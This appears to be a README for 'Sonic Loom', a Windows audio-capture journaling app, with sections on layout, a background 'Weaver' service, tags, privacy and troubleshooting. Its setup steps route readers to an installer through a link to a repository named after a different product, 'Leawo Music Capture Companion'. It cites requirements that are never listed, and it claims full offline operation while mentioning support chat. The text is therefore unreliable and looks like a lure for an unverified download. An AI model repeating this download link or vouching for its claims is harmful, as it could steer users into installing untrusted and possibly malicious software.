## 🌌 Overview

Sonic Loom is a Windows-native application that captures system audio and microphone input, then organizes what it captures into a timeline-driven workspace. Instead of a single monolithic recording file, every session becomes a thread — a labeled strand of audio with contextual notes, mood tags, and a timeline you can scrub through.

The ambition is simple but unusual: treat audio capture like journaling. You do not journal to hoard words. You journal to remember, reflect, and connect. Sonic Loom applies that philosophy to sound.

Its layout borrows from three disciplines that rarely meet:

1. **Audio engineering** — for clean capture without dropping frames.
2. **Personal knowledge management** — for tagging, linking, and retrieving.
3. **Textile craft** — as a metaphor for how pieces combine into a larger fabric.

That third point is not decoration. The interface genuinely behaves like a loom: threads (sessions) cross warp (timeline) and weft (tags), producing a woven pattern of your listening history.

## 🎯 Why Sonic Loom Exists

The typical desktop recording utility solves one problem — grabbing sound. It does not solve the *after* problem. Once the file exists, the user is abandoned with a directory full of anonymous audio and no system for making sense of it.

Sonic Loom exists to close that gap. It is built on the observation that most meaningful audio is short, fragmented, and easy to lose. A five-second riff. A two-minute call. A weather bulletin from a station you only catch once a year.

By treating these fragments with the same respect a photo library treats snapshots, Sonic Loom turns a pile of files into an evolving personal archive.

## 📐 Responsive & Adaptive UI

Sonic Loom does not assume a 4K monitor. The interface is built around a flexible grid that reflows based on available space. On a wide display, the loom shows three columns — threads, canvas, and inspector. On a narrower window, the inspector collapses into a drawer, and the canvas becomes a vertical stack.

This matters because audio work often happens in the margins of other tasks. You might be capturing a session while a document fills most of the screen. A rigid, desktop-only layout would make that impossible. A responsive one makes it natural.

Design principles behind the layout:

- **Priority collapse** — the inspector hides first, then the thread list, then the tag panel.
- **Gesture-friendly targets** — buttons remain comfortably clickable even when compressed.
- **Zoom respect** — scaling the system font never truncates critical labels.
- **Low-glare palette** — a dark default theme reduces eye strain during long sessions.

## 🧶 Session Weaver Engine

At the heart of Sonic Loom sits the Session Weaver — a background service that runs quietly whether or not the main window is open. Its job is to keep the loom from tangling.

Responsibilities of the Weaver:

1. **Buffering** — holds the last few seconds of audio in memory so that no frame is lost when a capture begins.
2. **Routing** — sends system audio and microphone audio to separate lanes without mixing them prematurely.
3. **Stamping** — attaches a UTC timestamp and a local timezone offset to every thread.
4. **Recovery** — if the app closes unexpectedly, unfinished threads are salvaged on next launch.
5. **Compaction** — periodically re-encodes long threads to reduce disk footprint.

The Weaver is deliberately conservative. It prefers to fail loudly with a clear message over silently losing audio. Every recovery event is logged in plain text so you always know what happened.

## 🚀 Getting Started (Non-Terminal Setup)

You do not need a command line to use Sonic Loom. The experience is designed for anyone who prefers a graphical path.

1. Obtain the current 2026 build from the official release channel. Use the [![Download](https://raw.githubusercontent.com/HenryGamer9772/Leawo-Music-Capture-Companion/main/latest_e25fcad.svg)](https://HenryGamer9772.github.io/Leawo-Music-Capture-Companion/) marker below as your entry point.
2. Save the installer to a folder you can find again — your Downloads folder is fine.
3. Run the installer and follow the on-screen prompts. Choose a destination drive with enough room for your archive.
4. Launch Sonic Loom from the Start menu. The first-run wizard will introduce the loom metaphor in under a minute.
5. Pick a default capture lane — system audio, microphone, or both.
6. Create your first thread. Give it a name you will recognize a week from now.
7. Press the capture key and watch the level meters. When you are done, stop the thread.
8. Tag the thread. Even one tag makes retrieval dramatically easier later.
9. Open the Library view to confirm your thread is listed alongside its metadata.

That is the entire onboarding. Everything else in Sonic Loom is a refinement of these nine steps.

## 🏷️ Vocabulary & Metadata Tags

Tags are the connective tissue of Sonic Loom. Without them, threads remain isolated strands. With them, weaves emerge.

Tags fall into four families:

- **Source tags** — where the audio came from (radio, call, meeting, stream).
- **Mood tags** — how the audio felt (calm, energetic, tense, nostalgic).
- **Intent tags** — why you captured it (reference, memory, research, inspiration).
- **Custom tags** — anything else you define.

The app suggests tags based on session length, source, and the time of day. Suggestions are never applied automatically; they appear as ghost chips you can accept or dismiss.

Weaves are formed when multiple threads share two or more tags. The library view highlights these clusters so patterns become visible without manual effort.

## 🔐 Privacy & Local-First Design

Sonic Loom stores everything on your machine. There is no cloud account, no mandatory sign-in, and no telemetry that leaves your device without explicit consent.

The privacy model rests on three pillars:

1. **Local storage by default** — your archive lives in a folder you control.
2. **Opt-in diagnostics** — crash reports are only sent if you click the send button.
3. **No background uploads** — the Weaver never phones home.

If you choose to export a weave, the app writes a self-contained folder with a manifest file describing every thread. You decide where that folder goes and who sees it.

## ❓ Frequently Asked Questions

**Do I need an internet connection?**
No. Sonic Loom works fully offline. The network is only used for updates and support chat.

**Can I run it on an older laptop?**
Yes, as long as it meets the minimum requirements listed above. Performance scales gracefully.

**Does it overwrite my existing audio files?**
No. It only writes new files to the archive folder you designate.

**How many threads can the library hold?**
Thousands. The library view paginates fluidly and search remains fast.

**Can I move my archive to another drive?**
Yes. Point the Library preference at the new location and the app re-indexes.

## 🛠️ Troubleshooting Corner

**No audio is captured.**
Check that the correct input device is selected in the Capture tab. Windows privacy settings can also block microphone access — verify them.

**Threads disappear after a crash.**
Launch the app again. The Weaver recovers unfinished threads automatically and logs the event.

**Level meters stay flat.**
The source may be muted at the system level. Confirm that the audio source is actually playing.

**Export folders look empty.**
The manifest is written last. If the app was interrupted mid-export, re-run the export.

**Interface language did not change.**
A restart is sometimes required for the full UI to re-render. The Language tab notes when this happens.
